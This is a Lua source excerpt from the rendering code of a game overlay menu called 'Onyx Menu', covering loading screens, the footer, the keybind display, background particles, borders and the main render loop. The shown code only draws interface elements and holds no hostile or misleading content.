        local textWidth = 0
        if Susano and Susano.GetTextWidth then
            textWidth = Susano.GetTextWidth(loadingText, textSize)
        else
            textWidth = string.len(loadingText) * 10
        end
        local textX = centerX - (textWidth / 2)
        local textY = centerY - radius - 40
        Menu.DrawText(textX, textY, loadingText, textSize, 1.0, 1.0, 1.0, 1.0 * alpha)
    end

    local segments = 90
    local step = 360 / segments
    local startAngle = -90

    for i = 0, segments do
        local angle = math.rad(startAngle + (i * step))
        local px = centerX + radius * math.cos(angle)
        local py = centerY + radius * math.sin(angle)
        local outlineSize = thickness + 4

        if Susano and Susano.DrawRectFilled then
            Susano.DrawRectFilled(px - outlineSize/2, py - outlineSize/2, outlineSize, outlineSize, 0.0, 0.0, 0.0, 1.0 * alpha, outlineSize/2)
        else
            Menu.DrawRect(px - outlineSize/2, py - outlineSize/2, outlineSize, outlineSize, 0, 0, 0, 255 * alpha)
        end
    end

    for i = 0, segments do
        local angle = math.rad(startAngle + (i * step))
        local px = centerX + radius * math.cos(angle)
        local py = centerY + radius * math.sin(angle)

        if Susano and Susano.DrawRectFilled then
            Susano.DrawRectFilled(px - thickness/2, py - thickness/2, thickness, thickness, 0.15, 0.15, 0.15, 1.0 * alpha, thickness/2)
        else
            Menu.DrawRect(px - thickness/2, py - thickness/2, thickness, thickness, 38, 38, 38, 255 * alpha)
        end
    end

    local progressSegments = math.floor(segments * (Menu.LoadingProgress / 100.0))
    local accentR = (Menu.Colors.SelectedBg and Menu.Colors.SelectedBg.r) and (Menu.Colors.SelectedBg.r / 255.0) or 1.0
    local accentG = (Menu.Colors.SelectedBg and Menu.Colors.SelectedBg.g) and (Menu.Colors.SelectedBg.g / 255.0) or 0.0
    local accentB = (Menu.Colors.SelectedBg and Menu.Colors.SelectedBg.b) and (Menu.Colors.SelectedBg.b / 255.0) or 1.0

    for i = 0, progressSegments do
        local angle = math.rad(startAngle + (i * step))
        local px = centerX + radius * math.cos(angle)
        local py = centerY + radius * math.sin(angle)

        if Susano and Susano.DrawRectFilled then
            Susano.DrawRectFilled(px - thickness/2, py - thickness/2, thickness + 1, thickness + 1, accentR, accentG, accentB, 1.0 * alpha, (thickness + 1)/2)
        else
            Menu.DrawRect(px - thickness/2, py - thickness/2, thickness + 1, thickness + 1, accentR * 255, accentG * 255, accentB * 255, 255 * alpha)
        end
    end

    local percentText = string.format("%.0f%%", Menu.LoadingProgress)
    local percentTextSize = 16
    local percentTextWidth = 0
    if Susano and Susano.GetTextWidth then
        percentTextWidth = Susano.GetTextWidth(percentText, percentTextSize)
    else
        percentTextWidth = string.len(percentText) * 9
    end
    local percentTextX = centerX - (percentTextWidth / 2)
    local percentTextY = centerY - (percentTextSize / 2)
    Menu.DrawText(percentTextX, percentTextY, percentText, percentTextSize, 1.0, 1.0, 1.0, 1.0 * alpha)
end

function Menu.DrawFooter()
    local scaledPos = Menu.GetScaledPosition()
    local scale = Menu.Scale or 1.0
    local x = scaledPos.x
    local footerY
    local totalHeight

    if Menu.OpenedCategory then
        local category = Menu.Categories[Menu.OpenedCategory]
        if category and category.hasTabs and category.tabs then
            local currentTab = category.tabs[Menu.CurrentTab]
            if currentTab and currentTab.items then
                local maxVisible = Menu.ItemsPerPage
                local totalItems = #currentTab.items
                local visibleItems = math.min(maxVisible, totalItems)
                totalHeight = scaledPos.headerHeight + scaledPos.mainMenuHeight + scaledPos.mainMenuSpacing + (visibleItems * scaledPos.itemHeight)
            else
                totalHeight = scaledPos.headerHeight + scaledPos.mainMenuHeight + scaledPos.mainMenuSpacing
            end
        else
            totalHeight = scaledPos.headerHeight + scaledPos.mainMenuHeight + scaledPos.mainMenuSpacing
        end
    else
        local maxVisible = Menu.ItemsPerPage
        local totalCategories = #Menu.Categories - 1
        local visibleCategories = math.min(maxVisible, totalCategories)
        totalHeight = scaledPos.headerHeight + (2 * scale) + scaledPos.mainMenuHeight + scaledPos.mainMenuSpacing + (visibleCategories * scaledPos.itemHeight)
    end

    footerY = scaledPos.y + totalHeight + scaledPos.footerSpacing
    local footerWidth = scaledPos.width - 1
    local footerHeight = scaledPos.footerHeight
    local footerRounding = scaledPos.footerRadius

    if Susano and Susano.DrawRectFilled then
        Susano.DrawRectFilled(x, footerY, footerWidth, footerHeight,
            0.0, 0.0, 0.0, 1.0,
            footerRounding)
    else
        Menu.DrawRoundedRect(x, footerY, footerWidth, footerHeight, 0, 0, 0, 255, footerRounding)
    end

    local footerPadding = 15 * scale
    local footerSize = 13
    local scaledFooterSize = footerSize * scale
    local footerTextY = footerY + (footerHeight / 2) - (scaledFooterSize / 2) + (1 * scale)

    local footerText = "7rz & Aboshakerold"
    local currentX = x + footerPadding

    local textWidth = 0
    if Susano and Susano.GetTextWidth then
        textWidth = Susano.GetTextWidth(footerText, scaledFooterSize)
    else
        textWidth = string.len(footerText) * 8 * scale
    end

    Menu.DrawText(currentX, footerTextY, footerText, footerSize, Menu.Colors.TextWhite.r / 255.0, Menu.Colors.TextWhite.g / 255.0, Menu.Colors.TextWhite.b / 255.0, 1.0)

    local displayIndex
    local totalItems

    if Menu.OpenedCategory then
        local category = Menu.Categories[Menu.OpenedCategory]
        if category and category.hasTabs and category.tabs then
            local currentTab = category.tabs[Menu.CurrentTab]
            if currentTab and currentTab.items then
                displayIndex = Menu.CurrentItem
                totalItems = #currentTab.items
            else
                displayIndex = 1
                totalItems = 1
            end
        else
            displayIndex = 1
            totalItems = 1
        end
    else
        displayIndex = Menu.CurrentCategory - 1
        if displayIndex < 1 then displayIndex = 1 end
        totalItems = #Menu.Categories - 1
    end

    local posText = string.format("%d/%d", displayIndex, totalItems)

    local posWidth = 0
    if Susano and Susano.GetTextWidth then
        posWidth = Susano.GetTextWidth(posText, scaledFooterSize)
    else
        posWidth = string.len(posText) * 8 * scale
    end

    local posX = x + footerWidth - posWidth - footerPadding
    Menu.DrawText(posX, footerTextY, posText, footerSize, Menu.Colors.TextWhite.r / 255.0, Menu.Colors.TextWhite.g / 255.0, Menu.Colors.TextWhite.b / 255.0, 1.0)
end

function Menu.DrawKeySelector(alpha)
    if alpha <= 0 then return end

    local screenWidth = 1920
    local screenHeight = 1080
    if Susano and Susano.GetScreenWidth and Susano.GetScreenHeight then
        screenWidth = Susano.GetScreenWidth()
        screenHeight = Susano.GetScreenHeight()
    end

    local padding = 15
    local cornerRadius = 8
    local barHeight = 4
    local lineHeight = 28
    local textSize = 14
    local headerHeight = 42

    local width = 400
    local startX = math.floor((screenWidth - width) / 2)
    local startY = math.floor(screenHeight - 160) -- bottom area

    local itemName = Menu.BindingItem and (Menu.BindingItem.name or "Option") or "Menu Toggle"
    local keyName = Menu.BindingItem and Menu.BindingKeyName or Menu.SelectedKeyName
    if not keyName then keyName = "..." end
    local status = "press a key"
    local rowText = itemName .. " [" .. keyName .. "] - " .. status

    local totalHeight = headerHeight + barHeight + padding + lineHeight + padding

    local menuR = (Menu.Colors.SelectedBg and Menu.Colors.SelectedBg.r) and (Menu.Colors.SelectedBg.r / 255.0) or 0.4
    local menuG = (Menu.Colors.SelectedBg and Menu.Colors.SelectedBg.g) and (Menu.Colors.SelectedBg.g / 255.0) or 0.2
    local menuB = (Menu.Colors.SelectedBg and Menu.Colors.SelectedBg.b) and (Menu.Colors.SelectedBg.b / 255.0) or 0.8

    local bgAlpha = 0.65 * alpha
    if Susano and Susano.DrawRectFilled then
        Susano.DrawRectFilled(startX, startY, width, totalHeight, 0.0, 0.0, 0.0, bgAlpha, cornerRadius)
    else
        Menu.DrawRoundedRect(startX, startY, width, totalHeight, 0, 0, 0, math.floor(255 * bgAlpha), cornerRadius)
    end

    local title = "KEYBIND"
    local titleX = startX + padding
    local titleY = startY + padding - 2
    Menu.DrawText(titleX - 1, titleY - 1, title, textSize, 0.0, 0.0, 0.0, 1.0 * alpha)
    Menu.DrawText(titleX + 1, titleY - 1, title, textSize, 0.0, 0.0, 0.0, 1.0 * alpha)
    Menu.DrawText(titleX - 1, titleY + 1, title, textSize, 0.0, 0.0, 0.0, 1.0 * alpha)
    Menu.DrawText(titleX + 1, titleY + 1, title, textSize, 0.0, 0.0, 0.0, 1.0 * alpha)
    Menu.DrawText(titleX, titleY, title, textSize, 1.0, 1.0, 1.0, 1.0 * alpha)

    local barY = startY + headerHeight
    local barLabel = "Choose a key"
    local barLabelSize = 12
    local barLabelW = Susano and Susano.GetTextWidth and Susano.GetTextWidth(barLabel, barLabelSize) or (string.len(barLabel) * 7)
    local barLabelX = startX + (width / 2) - (barLabelW / 2)
    local barLabelY = barY - barLabelSize - 4
    Menu.DrawText(barLabelX, barLabelY, barLabel, barLabelSize, 0.9, 0.9, 0.9, 1.0 * alpha)

    if Susano and Susano.DrawRectFilled then
        Susano.DrawRectFilled(startX + padding, barY, width - 2 * padding, barHeight, menuR, menuG, menuB, 1.0 * alpha, 0)
    else
        Menu.DrawRect(startX + padding, barY, width - 2 * padding, barHeight, math.floor(menuR * 255), math.floor(menuG * 255), math.floor(menuB * 255), math.floor(255 * alpha))
    end

    local rowY = barY + barHeight + padding
    local textX = startX + padding
    local textY = rowY + (lineHeight / 2) - (textSize / 2)

    Menu.DrawText(textX - 1, textY - 1, rowText, textSize, 0.0, 0.0, 0.0, 1.0 * alpha)
    Menu.DrawText(textX + 1, textY - 1, rowText, textSize, 0.0, 0.0, 0.0, 1.0 * alpha)
    Menu.DrawText(textX - 1, textY + 1, rowText, textSize, 0.0, 0.0, 0.0, 1.0 * alpha)
    Menu.DrawText(textX + 1, textY + 1, rowText, textSize, 0.0, 0.0, 0.0, 1.0 * alpha)
    Menu.DrawText(textX, textY, rowText, textSize, 1.0, 1.0, 1.0, 1.0 * alpha)

    local boxSize = 34
    local boxX = startX + width - padding - boxSize
    local boxY = rowY + (lineHeight / 2) - (boxSize / 2)
    if Susano and Susano.DrawRectFilled then
        Susano.DrawRectFilled(boxX, boxY, boxSize, boxSize, 0.12, 0.12, 0.12, 1.0 * alpha, 6)
    else
        Menu.DrawRect(boxX, boxY, boxSize, boxSize, 30, 30, 30, 255 * alpha)
    end

    local keySize = 18
    local keyW = Susano and Susano.GetTextWidth and Susano.GetTextWidth(keyName, keySize) or (string.len(keyName) * 9)
    Menu.DrawText(math.floor(boxX + (boxSize / 2) - (keyW / 2)), math.floor(boxY + (boxSize / 2) - (keySize / 2)), keyName, keySize, 1.0, 1.0, 1.0, 1.0 * alpha)
end

function Menu.DrawKeybindsInterface(alpha)
    if alpha <= 0 then
        return
    end

    local screenWidth = 1920
    local screenHeight = 1080
    if Susano and Susano.GetScreenWidth and Susano.GetScreenHeight then
        screenWidth = Susano.GetScreenWidth()
        screenHeight = Susano.GetScreenHeight()
    end

    local activeBinds = {}
    for _, cat in ipairs(Menu.Categories) do
        if cat.hasTabs and cat.tabs then
            for _, tab in ipairs(cat.tabs) do
                if tab.items then
                    for _, item in ipairs(tab.items) do
                        if item.bindKey and item.bindKeyName and (item.type == "toggle" or item.type == "action") then
                            table.insert(activeBinds, {
                                name = item.name,
                                keyName = item.bindKeyName,
                                isActive = (item.type == "toggle" and (item.value or false)) or nil
                            })
                        end
                    end
                end
            end
        end
    end

    if #activeBinds == 0 then
        return
    end

    local padding = 15
    local cornerRadius = 8
    local barHeight = 2
    local lineHeight = 25
    local textSize = 14
    local headerHeight = 40

    local maxWidth = 0
    for _, bind in ipairs(activeBinds) do
        local status = bind.isActive and "on" or "off"
        local text = bind.name .. " (" .. bind.keyName .. ") [" .. status .. "]"
        local textWidth = 0
        if Susano and Susano.GetTextWidth then
            textWidth = Susano.GetTextWidth(text, textSize)
        else
            textWidth = string.len(text) * 8
        end
        if textWidth > maxWidth then
            maxWidth = textWidth
        end
    end

    local width = math.max(200, maxWidth + (padding * 2))
    local startX = screenWidth - width - 20
    local startY = 20

    local contentHeight = #activeBinds * lineHeight
    local totalHeight = headerHeight + barHeight + padding + contentHeight + padding

    local menuR = (Menu.Colors.SelectedBg and Menu.Colors.SelectedBg.r) and (Menu.Colors.SelectedBg.r / 255.0) or 0.4
    local menuG = (Menu.Colors.SelectedBg and Menu.Colors.SelectedBg.g) and (Menu.Colors.SelectedBg.g / 255.0) or 0.2
    local menuB = (Menu.Colors.SelectedBg and Menu.Colors.SelectedBg.b) and (Menu.Colors.SelectedBg.b / 255.0) or 0.8

    local bgAlpha = 0.6 * alpha
    if Susano and Susano.DrawRectFilled then
        Susano.DrawRectFilled(startX, startY, width, totalHeight, 0.0, 0.0, 0.0, bgAlpha, cornerRadius)
    else
        Menu.DrawRoundedRect(startX, startY, width, totalHeight, 0, 0, 0, math.floor(255 * bgAlpha), cornerRadius)
    end

    local textX = startX + padding
    local textY = startY + padding
    Menu.DrawText(textX - 1, textY - 1, "keybind", textSize, 0.0, 0.0, 0.0, 1.0 * alpha)
    Menu.DrawText(textX + 1, textY - 1, "keybind", textSize, 0.0, 0.0, 0.0, 1.0 * alpha)
    Menu.DrawText(textX - 1, textY + 1, "keybind", textSize, 0.0, 0.0, 0.0, 1.0 * alpha)
    Menu.DrawText(textX + 1, textY + 1, "keybind", textSize, 0.0, 0.0, 0.0, 1.0 * alpha)
    Menu.DrawText(textX, textY, "keybind", textSize, 1.0, 1.0, 1.0, 1.0 * alpha)

    local barY = startY + headerHeight
    if Susano and Susano.DrawRectFilled then
        Susano.DrawRectFilled(startX + padding, barY, width - 2 * padding, barHeight, menuR, menuG, menuB, 1.0 * alpha, 0)
    else
        Menu.DrawRect(startX + padding, barY, width - 2 * padding, barHeight, math.floor(menuR * 255), math.floor(menuG * 255), math.floor(menuB * 255), math.floor(255 * alpha))
    end

    local currentY = barY + barHeight + padding
    for i, bind in ipairs(activeBinds) do
        local text
        if bind.isActive ~= nil then
            local status = bind.isActive and "on" or "off"
            text = bind.name .. " (" .. bind.keyName .. ") [" .. status .. "]"
        else
            text = bind.name .. " (" .. bind.keyName .. ")"
        end
        local bindTextX = startX + padding
        local bindTextY = currentY + (i - 1) * lineHeight

        Menu.DrawText(bindTextX - 1, bindTextY - 1, text, textSize, 0.0, 0.0, 0.0, 1.0 * alpha)
        Menu.DrawText(bindTextX + 1, bindTextY - 1, text, textSize, 0.0, 0.0, 0.0, 1.0 * alpha)
        Menu.DrawText(bindTextX - 1, bindTextY + 1, text, textSize, 0.0, 0.0, 0.0, 1.0 * alpha)
        Menu.DrawText(bindTextX + 1, bindTextY + 1, text, textSize, 0.0, 0.0, 0.0, 1.0 * alpha)
        Menu.DrawText(bindTextX, bindTextY, text, textSize, 1.0, 1.0, 1.0, 1.0 * alpha)
    end
end

Menu.Particles = {}
for i = 1, 80 do
    table.insert(Menu.Particles, {
        x = math.random(0, 100) / 100,
        y = math.random(0, 100) / 100,
        speedY = math.random(20, 100) / 10000,
        speedX = math.random(-20, 20) / 10000,
        size = math.random(1, 2),
        life = math.random(10, 50)
    })
end

function Menu.GetLayoutSegments()
    local segments = {}
    local scaledPos = Menu.GetScaledPosition()
    local x = scaledPos.x
    local startY = scaledPos.y
    local width = scaledPos.width

    local headerH = scaledPos.headerHeight
    local menuBarH = scaledPos.mainMenuHeight
    local spacing = scaledPos.mainMenuSpacing
    local itemH = scaledPos.itemHeight
    local footerSpacing = scaledPos.footerSpacing
    local footerH = scaledPos.footerHeight

    local topSegmentH = headerH + menuBarH
    if not Menu.OpenedCategory then
        topSegmentH = headerH + 2 + menuBarH
    end

    local menuBarY = startY + headerH
    local menuBarSegmentH = menuBarH
    if not Menu.OpenedCategory then
        menuBarY = startY + headerH + 2
        menuBarSegmentH = menuBarH
    end
    table.insert(segments, {y = menuBarY, h = menuBarSegmentH})

    local itemsY = startY + topSegmentH + spacing
    local itemsH = 0

    if Menu.OpenedCategory then
        local category = Menu.Categories[Menu.OpenedCategory]
        if category and category.hasTabs and category.tabs then
            local currentTab = category.tabs[Menu.CurrentTab]
            if currentTab and currentTab.items then
                local maxVisible = Menu.ItemsPerPage
                local totalItems = #currentTab.items
                local visibleItems = math.min(maxVisible, totalItems)
                itemsH = visibleItems * itemH
            end
        end
    else
        local maxVisible = Menu.ItemsPerPage
        local totalCategories = #Menu.Categories - 1
        local visibleCategories = math.min(maxVisible, totalCategories)
        itemsH = visibleCategories * itemH
    end

    if itemsH > 0 then
        table.insert(segments, {y = itemsY, h = itemsH})
    end

    local footerY = itemsY + itemsH + footerSpacing
    table.insert(segments, {y = footerY, h = footerH})

    local fullHeight = (footerY + footerH) - startY

    return segments, fullHeight
end

function Menu.DrawBackground()
    local scaledPos = Menu.GetScaledPosition()
    local x = scaledPos.x
    local y = scaledPos.y
    local width = scaledPos.width - 1 -- Match Header Width (was +1 before)

    local segments, fullHeight = Menu.GetLayoutSegments()

    local r = (Menu.Colors.SelectedBg and Menu.Colors.SelectedBg.r) or 148
    local g = (Menu.Colors.SelectedBg and Menu.Colors.SelectedBg.g) or 0
    local b = (Menu.Colors.SelectedBg and Menu.Colors.SelectedBg.b) or 211

    for i, seg in ipairs(segments) do
        if i == #segments then
            break
        end
        local segSteps = math.ceil(seg.h / 2) -- 2px precision

        for i = 0, segSteps - 1 do
            local localY = i * 2
            local drawH = 2
            if localY + drawH > seg.h then drawH = seg.h - localY end

            local currentY = seg.y + localY

            local factor = (currentY - y) / fullHeight

            local stepR = math.floor(r * (1 - factor) * 0.15)
            local stepG = math.floor(g * (1 - factor) * 0.15)
            local stepB = math.floor(b * (1 - factor) * 0.15)

            stepR = math.max(0, stepR)
            stepG = math.max(0, stepG)
            stepB = math.max(0, stepB)

            if Susano and Susano.DrawRectFilled then
                Susano.DrawRectFilled(x, currentY, width, drawH, stepR/255, stepG/255, stepB/255, 0.95, 0)
            else
                Menu.DrawRect(x, currentY, width, drawH, stepR, stepG, stepB, 240)
            end
        end
    end

    if Menu.ShowSnowflakes then
        for _, p in ipairs(Menu.Particles) do
            p.y = p.y + p.speedY
            p.x = p.x + p.speedX

            if p.y > 1.0 then
                p.y = 0
                p.x = math.random(0, 100) / 100
                p.speedY = math.random(20, 100) / 10000
                p.speedX = math.random(-20, 20) / 10000
            end

            local pX = x + (p.x * width)
            local pY = y + (p.y * fullHeight)

            local isVisible = false
            for i, seg in ipairs(segments) do
                if i == #segments then
                    break
                end
                if pY >= seg.y and pY <= seg.y + seg.h then
                    isVisible = true
                    break
                end
            end

            if isVisible then
                 local alpha = math.random(100, 200)
                 if Susano and Susano.DrawRectFilled then
                    Susano.DrawRectFilled(pX, pY, p.size, p.size, 1.0, 1.0, 1.0, alpha/255, 0)
                else
                    Menu.DrawRect(pX, pY, p.size, p.size, 255, 255, 255, alpha)
                end
            end
        end
    end
end

function Menu.DrawBorder()
    local scaledPos = Menu.GetScaledPosition()
    local scale = Menu.Scale or 1.0
    local x = scaledPos.x
    local y = scaledPos.y
    local width = scaledPos.width - 1

    local segments, fullHeight = Menu.GetLayoutSegments()

    local r = (Menu.Colors.SelectedBg and Menu.Colors.SelectedBg.r) or 148
    local g = (Menu.Colors.SelectedBg and Menu.Colors.SelectedBg.g) or 0
    local b = (Menu.Colors.SelectedBg and Menu.Colors.SelectedBg.b) or 211

    local borderSize = 1.5 * scale
    local borderAlpha = 0.7
    local borderRadius = 6 * scale
    local bR = r / 255.0
    local bG = g / 255.0
    local bB = b / 255.0

    for i, seg in ipairs(segments) do
        if i < #segments then
            if Susano and Susano.DrawRectFilled then
                Susano.DrawRectFilled(x - borderSize, seg.y - borderSize, borderSize, seg.h + borderSize * 2, bR, bG, bB, borderAlpha, borderRadius)
                Susano.DrawRectFilled(x + width, seg.y - borderSize, borderSize, seg.h + borderSize * 2, bR, bG, bB, borderAlpha, borderRadius)
                Susano.DrawRectFilled(x - borderSize, seg.y - borderSize, width + borderSize * 2, borderSize, bR, bG, bB, borderAlpha, borderRadius)
                Susano.DrawRectFilled(x - borderSize, seg.y + seg.h, width + borderSize * 2, borderSize, bR, bG, bB, borderAlpha, borderRadius)
            else
                Menu.DrawRect(x - borderSize, seg.y - borderSize, borderSize, seg.h + borderSize * 2, r, g, b, math.floor(borderAlpha * 255))
                Menu.DrawRect(x + width, seg.y - borderSize, borderSize, seg.h + borderSize * 2, r, g, b, math.floor(borderAlpha * 255))
                Menu.DrawRect(x - borderSize, seg.y - borderSize, width + borderSize * 2, borderSize, r, g, b, math.floor(borderAlpha * 255))
                Menu.DrawRect(x - borderSize, seg.y + seg.h, width + borderSize * 2, borderSize, r, g, b, math.floor(borderAlpha * 255))
            end
        end
    end

    local headerY = scaledPos.y
    local headerH = scaledPos.headerHeight
    if Susano and Susano.DrawRectFilled then
        Susano.DrawRectFilled(x - borderSize, headerY - borderSize, borderSize, headerH + borderSize * 2, bR, bG, bB, borderAlpha, borderRadius)
        Susano.DrawRectFilled(x + width, headerY - borderSize, borderSize, headerH + borderSize * 2, bR, bG, bB, borderAlpha, borderRadius)
        Susano.DrawRectFilled(x - borderSize, headerY - borderSize, width + borderSize * 2, borderSize, bR, bG, bB, borderAlpha, borderRadius)
    else
        Menu.DrawRect(x - borderSize, headerY - borderSize, borderSize, headerH + borderSize * 2, r, g, b, math.floor(borderAlpha * 255))
        Menu.DrawRect(x + width, headerY - borderSize, borderSize, headerH + borderSize * 2, r, g, b, math.floor(borderAlpha * 255))
        Menu.DrawRect(x - borderSize, headerY - borderSize, width + borderSize * 2, borderSize, r, g, b, math.floor(borderAlpha * 255))
    end
end

function Menu.StartCustomLoading(duration, callback, loadingType)
    Menu.CustomLoading.active = true
    Menu.CustomLoading.progress = 0.0
    Menu.CustomLoading.startTime = GetGameTimer() or 0
    Menu.CustomLoading.duration = duration or 2000
    Menu.CustomLoading.callback = callback
    Menu.CustomLoading.type = loadingType or "loader"
end

function Menu.DrawCustomLoadingScreen(progress)
    local screenWidth = 1920
    local screenHeight = 1080
    if Susano and Susano.GetScreenWidth and Susano.GetScreenHeight then
        screenWidth = Susano.GetScreenWidth()
        screenHeight = Susano.GetScreenHeight()
    end

    local centerX = screenWidth / 2
    local centerY = screenHeight / 2
    local loadType = (Menu.CustomLoading and Menu.CustomLoading.type) or "loader"

    if loadType == "welcome" then
        -- 1. earnest-truffle-927320.netlify.app Replica (Welcome style)
        if Susano.DrawRectFilled then
            Susano.DrawRectFilled(0, 0, screenWidth, screenHeight, 0.02, 0.02, 0.03, 1.0, 0)
        else
            Menu.DrawRect(0, 0, screenWidth, screenHeight, 5, 5, 8, 255)
        end

        local glowSize = 500
        if Susano.DrawRectFilled then
            Susano.DrawRectFilled(centerX - glowSize / 2, centerY - glowSize / 2, glowSize, glowSize, 0.0, 0.95, 1.0, 0.06, glowSize / 2)
        end

        local cardW = 500
        local cardH = 160
        local cardX = centerX - (cardW / 2)
        local cardY = centerY - (cardH / 2)

        if Susano.DrawRectFilled then
            Susano.DrawRectFilled(cardX, cardY, cardW, cardH, 0.04, 0.04, 0.06, 0.4, 24)
            local borderAlpha = 0.05
            Susano.DrawRectFilled(cardX, cardY, cardW, 1, 1.0, 1.0, 1.0, borderAlpha, 0)
            Susano.DrawRectFilled(cardX, cardY + cardH - 1, cardW, 1, 1.0, 1.0, 1.0, borderAlpha, 0)
            Susano.DrawRectFilled(cardX, cardY, 1, cardH, 1.0, 1.0, 1.0, borderAlpha, 0)
            Susano.DrawRectFilled(cardX + cardW - 1, cardY, 1, cardH, 1.0, 1.0, 1.0, borderAlpha, 0)
        else
            Menu.DrawRect(cardX, cardY, cardW, cardH, 10, 10, 15, 100)
        end

        local titleText = "Welcome to Onyx Menu"
        local textSize = 26
        local textW = 0
        if Susano and Susano.GetTextWidth then
            textW = Susano.GetTextWidth(titleText, textSize)
        else
            textW = string.len(titleText) * 11
        end
        local textX = centerX - (textW / 2)
        local textY = cardY + 40
        Menu.DrawText(textX, textY, titleText, textSize, 0.8, 0.98, 1.0, 1.0)

        local maxLineW = cardW - 120
        local lineW = maxLineW * (progress / 100.0)
        local lineH = 3
        local lineX = centerX - (lineW / 2)
        local lineY = cardY + 100

        if Susano.DrawRectFilled then
            Susano.DrawRectFilled(lineX, lineY, lineW, lineH, 0.0, 0.95, 1.0, 0.9, 2)
            Susano.DrawRectFilled(lineX, lineY - 1, lineW, lineH + 2, 0.5, 0.0, 1.0, 0.3, 4)
        else
            Menu.DrawRect(lineX, lineY, lineW, lineH, 0, 242, 254, 255)
        end
    else
        -- 2. tubular-buttercream-7a38a1.netlify.app Replica (Loader / Action style)
        if Susano.DrawRectFilled then
            Susano.DrawRectFilled(0, 0, screenWidth, screenHeight, 0.02, 0.02, 0.04, 1.0, 0)
        else
            Menu.DrawRect(0, 0, screenWidth, screenHeight, 5, 5, 10, 255)
        end

        local glowSize = 350
        if Susano.DrawRectFilled then
            Susano.DrawRectFilled(centerX - glowSize / 2, centerY - glowSize / 2, glowSize, glowSize, 0.0, 0.95, 1.0, 0.08, glowSize / 2)
        end

        local cardW = 380
        local cardH = 125
        local cardX = centerX - (cardW / 2)
        local cardY = centerY - (cardH / 2)

        if Susano.DrawRectFilled then
            Susano.DrawRectFilled(cardX, cardY, cardW, cardH, 1.0, 1.0, 1.0, 0.02, 20)
            local borderAlpha = 0.08
            Susano.DrawRectFilled(cardX, cardY, cardW, 1, 1.0, 1.0, 1.0, borderAlpha, 0)
            Susano.DrawRectFilled(cardX, cardY + cardH - 1, cardW, 1, 1.0, 1.0, 1.0, borderAlpha, 0)
            Susano.DrawRectFilled(cardX, cardY, 1, cardH, 1.0, 1.0, 1.0, borderAlpha, 0)
            Susano.DrawRectFilled(cardX + cardW - 1, cardY, 1, cardH, 1.0, 1.0, 1.0, borderAlpha, 0)
        else
            Menu.DrawRect(cardX, cardY, cardW, cardH, 255, 255, 255, 5)
        end

        local barW = cardW - 60
        local barH = 8
        local barX = centerX - (barW / 2)
        local barY = cardY + 35

        if Susano.DrawRectFilled then
            Susano.DrawRectFilled(barX, barY, barW, barH, 1.0, 1.0, 1.0, 0.05, 4)
            local fillW = barW * (progress / 100.0)
            if fillW > 0 then
                Susano.DrawRectFilled(barX, barY, fillW, barH, 0.0, 0.95, 1.0, 1.0, 4)
                Susano.DrawRectFilled(barX - 2, barY - 2, fillW + 4, barH + 4, 0.0, 0.95, 1.0, 0.15, 6)
            end
        else
            Menu.DrawRect(barX, barY, barW, barH, 255, 255, 255, 12)
            local fillW = barW * (progress / 100.0)
            if fillW > 0 then
                Menu.DrawRect(barX, barY, fillW, barH, 0, 242, 254, 255)
            end
        end

        local pctText = string.format("%.0f%%", progress)
        local textSize = 26
        local textW = 0
        if Susano and Susano.GetTextWidth then
            textW = Susano.GetTextWidth(pctText, textSize)
        else
            textW = string.len(pctText) * 12
        end
        local textX = centerX - (textW / 2)
        local textY = cardY + 70
        Menu.DrawText(textX, textY, pctText, textSize, 0.0, 0.95, 1.0, 1.0)
    end
end

function Menu.Render()
    if Menu.TopLevelTabs and not Menu.Categories then
        Menu.UpdateCategoriesFromTopTab()
    end

    if not (Susano and Susano.BeginFrame) then
        return
    end

    if Menu.CustomLoading and Menu.CustomLoading.active then
        local currentTime = GetGameTimer() or 0
        local elapsed = currentTime - Menu.CustomLoading.startTime
        local progress = (elapsed / Menu.CustomLoading.duration) * 100.0
        if progress >= 100.0 then
            progress = 100.0
            Menu.CustomLoading.active = false
            if Menu.CustomLoading.callback then
                local success, err = pcall(Menu.CustomLoading.callback)
                if not success then
                    print("Error running custom loading callback: " .. tostring(err))
                end
            end
        end
        Menu.CustomLoading.progress = progress

        Susano.BeginFrame()
        Menu.DrawCustomLoadingScreen(progress)
        if Susano.SubmitFrame then
            Susano.SubmitFrame()
        end
        return
    end

    local dt = 0.016
    if GetFrameTime then
        dt = GetFrameTime()
    end
    local animSpeed = 5.0 * dt

    if Menu.IsLoading then
        Menu.LoadingBarAlpha = math.min(1.0, Menu.LoadingBarAlpha + animSpeed)
    else
        Menu.LoadingBarAlpha = math.max(0.0, Menu.LoadingBarAlpha - animSpeed)
    end

    if Menu.SelectingKey or Menu.SelectingBind then
        Menu.KeySelectorAlpha = math.min(1.0, Menu.KeySelectorAlpha + animSpeed)
    else
        Menu.KeySelectorAlpha = math.max(0.0, Menu.KeySelectorAlpha - animSpeed)
    end

    if Menu.ShowKeybinds then
        Menu.KeybindsInterfaceAlpha = math.min(1.0, Menu.KeybindsInterfaceAlpha + animSpeed)
    else
        Menu.KeybindsInterfaceAlpha = math.max(0.0, Menu.KeybindsInterfaceAlpha - animSpeed)
    end

    Susano.BeginFrame()

    if Menu.KeybindsInterfaceAlpha > 0 then
        Menu.DrawKeybindsInterface(Menu.KeybindsInterfaceAlpha)
    end

    if Menu.Visible then
        if Menu.EditorMode and Susano and Susano.EnableOverlay then
            Susano.EnableOverlay(true)
        elseif not Menu.EditorMode and Susano and Susano.EnableOverlay then
            Susano.EnableOverlay(false)
        end

        if Menu.LastItemIndex ~= Menu.CurrentItem then
            Menu.FadeAlpha = 0.2
            Menu.LastItemIndex = Menu.CurrentItem
        end
        Menu.FadeAlpha = Menu.FadeAlpha + (1.0 - Menu.FadeAlpha) * 0.03
        if Menu.FadeAlpha > 0.98 then Menu.FadeAlpha = 1.0 end

        Menu.DrawBackground()
        Menu.DrawBorder()
        Menu.DrawHeader()
        Menu.DrawCategories()
        Menu.DrawFooter()
    end

    if Menu.InputOpen then
        Menu.DrawInputWindow()
    end

    if Menu.LoadingBarAlpha > 0 then
        Menu.DrawLoadingBar(Menu.LoadingBarAlpha)
    end

    if Menu.KeySelectorAlpha > 0 then
        Menu.DrawKeySelector(Menu.KeySelectorAlpha)
    end

    if Menu.OnRender then
        local success, err = pcall(Menu.OnRender)
        if not success then
        end
    end

    Menu.DrawToasts()
    Menu.DrawActiveHUD()
    Menu.DrawSpectatorHUD()
    if Menu.DrawFreecamHUD then
        Menu.DrawFreecamHUD()
    end

    if Susano.SubmitFrame then
        Susano.SubmitFrame()
    end

